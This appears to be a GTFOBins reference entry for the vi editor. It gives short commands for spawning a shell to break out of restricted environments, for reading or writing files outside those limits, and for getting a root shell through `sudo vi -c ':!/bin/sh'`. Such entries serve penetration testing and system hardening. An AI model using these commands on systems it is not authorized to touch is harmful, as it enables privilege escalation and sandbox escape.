# GTFOBin: vi

Modern Unix systems run `vim` binary when `vi` is called.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
vi -c ':!/bin/sh' /dev/null
```

```
vi
:set shell=/bin/sh
:shell
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
vi file_to_write
iDATA
^[
w
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
vi file_to_read
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo vi -c ':!/bin/sh' /dev/null
```